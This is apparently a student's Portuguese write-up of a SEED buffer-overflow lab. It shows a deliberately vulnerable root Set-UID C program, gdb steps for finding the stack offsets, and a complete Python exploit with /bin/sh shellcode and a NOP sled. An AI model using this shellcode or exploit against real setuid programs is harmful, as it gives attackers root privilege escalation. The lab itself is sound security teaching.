# Semana #5 - Buffer-Overflow Attack Lab - Set-UID Version

## Task 1 - Getting familiar with shellcode

Esta task familiariza-nos com shellcode. Aprendemos que a melhor maneira para correr shellcode é através de código assembly. Aprendemos, também, um pouco sobre o código assembly utilizado para chamar a função **execve()** e executar `/bin//sh`.
Depois de compilar o ficheiro `call_shellcode.c`, são criados 2 ficheiros:

- `a32.out`, que contém o código em 32 bits
- `a64.out`, que contém o código em 64 bits

Embora o código assembly seja diferente dependendo se é 32 bits ou 64 bits, quando corremos notamos que ambos, de facto, abrem a shell bash e, depois de escrever `whoami`, ambas as bashes respondem com **seed**.


## Task 2 - Understanding the Vulnerable Program

Primeiramente, começamos por compilar o ficheiro `stack.c` e torná-lo num Set-UID program através dos seguintes comandos:

```
sudo chown root stack
```


```
sudo chmod 4755 stack
```

O conteúdo do `stack.c` é o seguinte:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str){
    char buffer[BUF_SIZE];
    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv){
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```


Alternadamente, podemos simplesmente fazer **make**, pois o `Makefile` já tem as instruções para fazer isto.

Depois de fazer **make**, são criados 4 pares de ficheiros executáveis:

- `stack-L1` e `stack-L1.dbg`
- `stack-L2` e `stack-L2.dbg`
- `stack-L3` e `stack-L3.dbg`
- `stack-L4` e `stack-L4.dbg`

Agora, falta mudar o conteúdo do `badfile`` para conseguirmos dar exploit à vulnerabilidade existente.

## Task 3 - Launching Attack on 32-bit Program (Level 1)

Primeiro, temos que criar o ficheiro `badfile``:

```
touch badfile
```

Agora, vamos correr o código em modo debug para conseguirmos descobrir a distância entre a posição inicial do **buffer** e o sítio onde o **return address** está armazenado. Para isso, vamos escrever a seguinte instrução: 

```
gdb stack-L1-dbg
```

Depois de meter um breakpoint na função **bof()**, executar o programa e dar alguns passos para a frente, podemos saber o endereço do **$ebp** da seguinte forma:

```
p $ebp
```

Que retornou `(void *) 0xffffcb18`.<br>
Podemos fazer o mesmo para descobrir o endereço do buffer:

```
p &buffer
```

Que retornou `0xffffcaac`.<br>

Por fim, alteramos o ficheiro `exploit.py` para ter os valores dos endereços obtidos. O ficheiro final ficou assim:

```py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's (do nothing operation)
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcb18 + 190
offset = 0xffffcb18 - 0xffffcaac + 4

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```
